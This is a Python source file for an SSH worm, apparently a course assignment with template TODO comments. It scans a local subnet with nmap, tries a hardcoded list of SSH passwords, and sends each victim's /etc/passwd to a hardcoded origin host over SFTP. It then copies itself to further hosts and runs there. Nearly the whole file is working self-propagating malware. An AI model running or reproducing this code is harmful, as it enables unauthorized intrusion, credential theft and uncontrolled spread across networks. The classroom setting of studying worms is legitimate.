import paramiko
import sys
import socket
import nmap
#import netinfo
import os
import sys
import fcntl
import struct
import netifaces

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('ubuntu','123456')
]

OriginUserName = 'ubuntu'
OriginPassword = '123456'
# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

OriginSystem = '192.168.1.5'
##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
	

	return os.path.exists(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():

	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	fileObj = open(INFECTED_MARKER_FILE, "w")

	# Write something to the file
	fileObj.write("You are not Prepared!...")

	# Close the file
	fileObj.close()


###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):

	sftpClient = sshClient.open_sftp()
	sftpClient.put("/tmp/passwordthief_worm.py", "/tmp/passwordthief_worm.py")

	sshClient.exec_command("chmod a+x /tmp/passwordthief_worm.py")
	sshClient.exec_command("python /tmp/passwordthief_worm.py")



	# This function takes as a parameter
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.



############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):

	#Define variable for returnStatus, set to 0
	connectionStatus = 1

	try:
		sshClient.connect(host,username = userName, password = password)
		#if successful
		connectionStatus = 0
		print 'Sucessfully Connected'
	except paramiko.SSHException:
		connectionStatus = 1
		print 'Wrong Credentials'
	except socket.error:
		connectionStatus = 3
		print 'Server down'
	return connectionStatus




###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):

	# The credential list
	global credList

	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# The results of an attempt
	attemptResults = None

	# Go through the credentials
	print 'Attempt to connect to '+ host
	for (username, password) in credList:

		connectionStatus = tryCredentials(host,username,password,ssh)
		if (connectionStatus == 0):
			attemptResults = ssh
		if(connectionStatus == 3):
			break #not computer


	# If failed, will return None
	return attemptResults

def openOriginSystem(host):
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# The results of an attempt
	attemptResults = None

	# Go through the credentials
	print 'Attempt to connect to Origin Host: '+ host
	for (username, password) in credList:

		connectionStatus = tryCredentials(host,username,password,ssh)
		if (connectionStatus == 0):
			attemptResults = ssh
		if(connectionStatus == 3):
			break #not computer


	# If failed, will return None
	return attemptResults

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP():


	networkInterfaces = netifaces.interfaces()

	ipAddr = None
	for netFace in networkInterfaces:
		address = netifaces.ifaddresses(netFace)[2][0]['addr']

		if not address == "127.0.0.1":
			# Save the IP addrss and break
			ipAddr = address
			break
	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():

	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.

	portScanner = nmap.PortScanner()

	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

	hostInfo = portScanner.all_hosts()
	liveHosts = []

	for host in hostInfo:

		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)

	return liveHosts



# If we are being run without a command line parameters,
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.
currentSystem = getMyIP()

if currentSystem != OriginSystem:
	if isInfectedSystem() == True:
		print 'system already infected'
		
	else:
		
		sshInfoForOrigin = openOriginSystem(OriginSystem)
		
		if sshInfoForOrigin:
			try:

			
				print 'Starting to connect to attacker system'
		
				sftpClientO = sshInfoForOrigin.open_sftp()

		
				localPath = '/etc/passwd'
				remotePath = '/tmp/passwd' + currentSystem
				sftpClientO.put(localPath,remotePath)
				markInfected()
				print 'System is marked infected'

			except:
				print 'Cannot connect to Origin (Attacking System)'
				exit()
		else:
			print 'Cannot connect to Origin (prior to try:)'



else:
	print'Currently the Origin System. Will only spread'





	# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

	# TODO: Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).


print 'Removing current host ' +' from networkHosts'

if (currentSystem == OriginSystem):
	networkHosts.remove(OriginSystem)
else:
	networkHosts.remove(OriginSystem)
	networkHosts.remove(currentSystem)


print "Found hosts: ", networkHosts


	# Go through the network hosts



for host in networkHosts:

		# Try to attack this host
	sshInfo =  attackSystem(host)


		#print sshInfo


		# Did the attack succeed?
	if sshInfo:

		print "Attempting to spread to "+ host
			
		try:
			sftpClient = sshInfo.open_sftp()
			sftpClient.stat('/tmp/infected.txt')
			print host+ ' is already infected'
		except IOError:
			spreadAndExecute(sshInfo) 
			print 'successfully spread to ' +host
			break


print 'Worm finished executing'


			
			
